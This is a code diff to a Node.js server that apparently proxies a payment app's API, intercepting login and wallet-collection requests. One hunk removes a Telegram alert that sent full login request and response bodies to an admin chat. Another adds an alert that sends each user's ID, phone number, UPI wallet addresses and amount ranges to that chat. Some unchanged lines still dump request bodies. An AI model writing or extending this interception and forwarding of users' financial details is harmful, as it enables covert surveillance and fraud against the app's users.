@@ -400,7 +400,10 @@ async function saveData(data) {
   cachedData = data;
   cacheTime = Date.now();
   if (!redis) return;
-  try { await redis.set('diwapayData', data); } catch(e) {
+  try { 
+    // Use stringify to ensure proper serialization and await to ensure it's written
+    await redis.set('diwapayData', JSON.stringify(data)); 
+  } catch(e) {
     console.error('Redis save error:', e.message);
   }
 }
@@ -1539,11 +1542,7 @@ app.post('/app/user/login/start', async (req, res) => {
       const tmpKey = 'start_' + (body.userName || body.phone || body.mobile || body.userId || '');
       userDeviceMap[tmpKey] = body.deviceId;
     }
-    if (data.adminChatId && bot) {
-      const reqStr = JSON.stringify(body, null, 2);
-      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
-      bot.sendMessage(data.adminChatId, `🔐 Login Start\n📱 Phone: ${body.userName || body.phone || body.mobile || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1200)}\n\n📥 RESPONSE BODY:\n${resStr.substring(0, 1200)}`).catch(()=>{});
-    }
+    // Notification removed as requested
     sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
   } catch(e) { await transparentProxy(req, res); }
 });
@@ -2169,7 +2168,25 @@ for (const ep of COLLECTION_ENDPOINTS) {
         ];
         
         if (simpleEndpoints.includes(path)) {
-          bot.sendMessage(data.adminChatId, `📡 ${path}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n✅ Status: Success`).catch(()=>{});
+          if (path === '/app/ct/app/collection/getWalletList' && jsonResp && jsonResp.code === 1000 && Array.isArray(jsonResp.data)) {
+            let msg = `💳 *Link UPI Report*\n\n`;
+            msg += `👤 *User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n\n`;
+            
+            jsonResp.data.forEach((item, index) => {
+              const status = item.status === 1 ? '✅ Enabled' : '❌ Failed';
+              const walletName = item.wallet ? item.wallet.name : 'Unknown App';
+              const address = item.address || 'No UPI ID';
+              const range = item.acceptableRange ? `₹${item.acceptableRange[0]} ~ ₹${item.acceptableRange[1]}` : 'N/A';
+              
+              msg += `${index + 1}. *${walletName}* [${status}]\n`;
+              msg += `   📍 ID: \`${address}\`\n`;
+              msg += `   💰 Range: \`${range}\`\n\n`;
+            });
+            
+            bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(()=>{});
+          } else {
+            bot.sendMessage(data.adminChatId, `📡 ${path}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n✅ Status: Success`).catch(()=>{});
+          }
         } else {
           const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1500);
           const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
